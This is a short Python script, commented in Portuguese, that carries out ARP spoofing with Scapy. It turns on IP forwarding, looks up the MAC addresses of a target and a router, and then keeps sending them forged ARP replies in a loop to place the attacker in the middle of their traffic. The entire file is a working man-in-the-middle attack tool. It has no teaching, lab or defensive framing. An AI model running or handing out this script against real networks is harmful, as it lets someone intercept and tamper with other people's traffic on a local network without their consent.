from scapy.all import ARP, Ether, send, srp
import os
import platform

def enable_ip_forwarding():
    """
    Ativa o redirecionamento de pacotes.
    Compatível com macOS e Linux.
    """
    system = platform.system()
    if system == "Darwin":  # macOS
        os.system("sysctl -w net.inet.ip.forwarding=1")
        print("[INFO] IP Forwarding ativado no macOS.")
    elif system == "Linux":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[INFO] IP Forwarding ativado no Linux.")
    else:
        print("[ERRO] Sistema não suportado para ativar IP Forwarding.")

def get_mac(ip):
    """
    Obtém o endereço MAC de um IP usando solicitações ARP.
    """
    print(f"[INFO] Tentando obter o MAC para {ip}...")
    # Força a tabela ARP a atualizar
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    response, _ = srp(packet, timeout=3, verbose=False)
    if response:
        mac = response[0][1].hwsrc
        print(f"[INFO] MAC encontrado para {ip}: {mac}")
        return mac
    else:
        # Consulta a tabela ARP do sistema como fallback
        result = os.popen(f"arp -n {ip}").read()
        if ip in result:
            mac = result.split()[3]
            if mac != "(incomplete)":
                print(f"[INFO] MAC encontrado na tabela ARP para {ip}: {mac}")
                return mac
        print(f"[ERRO] Não foi possível encontrar o MAC para {ip}.")
        return None

def arp_spoof(target_ip, spoof_ip):
    """
    Realiza ARP Spoofing entre o alvo e o roteador.
    """
    # Valida os IPs fornecidos
    if not target_ip or not spoof_ip:
        print("[ERRO] Os IPs do alvo e do roteador devem ser fornecidos.")
        return

    # Obtém os MACs dos dispositivos
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)

    if not target_mac or not spoof_mac:
        print("[ERRO] Não foi possível obter todos os MACs necessários.")
        return

    # Cria os pacotes ARP Spoofing
    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    router_packet = ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)

    print(f"[INFO] Iniciando ARP spoofing: {target_ip} -> {spoof_ip}")
    try:
        while True:
            send(target_packet, verbose=False)
            send(router_packet, verbose=False)
    except KeyboardInterrupt:
        print("\n[INFO] ARP spoofing interrompido.")

if __name__ == "__main__":
    enable_ip_forwarding()

    # Solicita os IPs do alvo e do roteador
    target_ip = input("Digite o IP do alvo: ").strip()
    spoof_ip = input("Digite o IP do roteador: ").strip()

    # Executa o ARP Spoofing
    arp_spoof(target_ip, spoof_ip)
